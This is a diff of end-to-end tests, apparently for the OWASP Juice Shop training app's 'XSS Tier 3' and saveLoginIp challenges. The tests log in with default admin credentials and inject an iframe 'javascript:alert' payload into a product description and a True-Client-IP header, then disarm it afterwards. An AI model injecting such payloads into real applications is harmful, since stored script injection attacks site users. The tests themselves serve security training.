@@ -1,31 +1,46 @@
 const config = require('config')
+const models = require('../../models/index')
 
 describe('/api', () => {
   describe('challenge "xss3"', () => {
     protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })
 
-    xit('should be possible to create a new product when logged in', () => {
+    it('should be possible to create a new product when logged in', () => {
       const EC = protractor.ExpectedConditions
-      browser.waitForAngularEnabled(false)
-      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.post(\'/api/Products\', {name: \'XSS3\', description: \'<iframe src="javascript:alert(xss)">\', price: 47.11});')
-      browser.driver.sleep(1000)
-      browser.waitForAngularEnabled(true)
+      browser.executeScript(() => {
+        var xhttp = new XMLHttpRequest()
+        xhttp.onreadystatechange = function () {
+          if (this.status === 200) {
+            console.log('Success')
+          }
+        }
+        xhttp.open('POST', 'http://localhost:3000/api/Products', true)
+        xhttp.setRequestHeader('Content-type', 'application/json')
+        xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
+        xhttp.send(JSON.stringify({ name: 'XSS3', 'description': '<iframe src="javascript:alert(`xss`)">', 'price': 47.11 }))
+      })
 
-      browser.get('/#/search')
-      browser.wait(EC.alertIsPresent(), 5000, "'xss' alert is not present")
+      browser.waitForAngularEnabled(false)
+      browser.get('/#/search?q=XSS3')
+      browser.refresh()
+      browser.wait(EC.alertIsPresent(), 10000, "'xss' alert is not present")
       browser.switchTo().alert().then(
         alert => {
           expect(alert.getText()).toEqual('xss')
           alert.accept()
-
-          browser.waitForAngularEnabled(false)
-          browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.put(\'/api/Products/' + (config.get('products').length + 1) + '\', {description: \'alert disabled\'});')
-          browser.driver.sleep(1000)
-          browser.waitForAngularEnabled(true)
+          // Disarm XSS payload so subsequent tests do not run into unexpected alert boxes
+          models.Product.findOne({ where: { name: 'XSS3' } }).then(product => {
+            product.update({ description: '&lt;iframe src="javascript:alert(`xss`)"&gt;' }).catch(error => {
+              console.log(error)
+            })
+          }).catch(error => {
+            console.log(error)
+          })
         })
+      browser.waitForAngularEnabled(true)
     })
 
-    // protractor.expect.challengeSolved({challenge: 'XSS Tier 3'})
+    protractor.expect.challengeSolved({ challenge: 'XSS Tier 3' })
   })
 
   describe('challenge "changeProduct"', () => {
@@ -66,8 +81,8 @@ describe('/rest/saveLoginIp', () => {
           }
         }
         xhttp.open('GET', 'http://localhost:3000/rest/saveLoginIp', true)
-        xhttp.setRequestHeader("Authorization",`Bearer ${localStorage.getItem("token")}`)
-        xhttp.setRequestHeader('True-Client-IP','<iframe src="javascript:alert(`xss`)">')
+        xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
+        xhttp.setRequestHeader('True-Client-IP', '<iframe src="javascript:alert(`xss`)">')
         xhttp.send()
       })
       browser.driver.sleep(1000)
